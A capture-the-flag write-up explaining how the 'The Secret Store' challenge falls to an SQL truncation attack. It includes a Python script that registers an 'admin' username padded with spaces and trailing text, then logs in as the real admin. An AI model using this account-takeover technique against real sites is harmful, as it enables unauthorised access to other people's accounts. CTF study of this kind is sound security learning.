# Internetwache : The Secret Store

#### Author: Wh1t3Fox

**Description**:
> We were presented with a website and the following information:
>
> We all love secrets. Without them, our lives would be dull. A student wrote a secure secret store,
> however he was babbling about problems with the database. Maybe I shouldn't use the 'admin' account.
> Hint1: Account deletion is intentional.
> Hint2: I can't handle long usernames.

With Hint2 revealed my first thought was this was an SQL Truncation attack. The basic concept of this
attack is that a user can create an account with a long username, however when logging in the
username gets truncated to the allowed length.

The first thing I did was write a Python script to help me figure out the maximum allowed length for
the username. Once this is found I then used a appended spaces to fill up the max length followed by
a string. The truncation would remove the string at the and match the username
even with the spaces.

### Code

    #1/usr/bin/env python2
    from bs4 import BeautifulSoup as bs
    from random import randrange
    import requests

    url = "https://the-secret-store.ctf.internetwache.org"

    def register(sess, user, passwd, token):
        r = sess.post(url + '/register.php', data={'user':user, 'password':passwd, 'secret':token})

    def login(sess, user, passwd):
        r = sess.post(url + '/index.php', data={'user':user, 'password':passwd})
        soup = bs(r.content, "lxml")
        div = soup.findAll("div", {"class": "jumbotron"})
        print(div[0].contents[2])

    def main():
        sess = requests.Session()

        uname = 'admin' + ' ' * 32 + 'FUCK BITCHES GET MONEY'
        passwd = 'A*4'

        r = sess.get(url)
        register(sess, uname, passwd, passwd)
        login(sess, 'admin', passwd)


    if __name__ == '__main__':
        main()
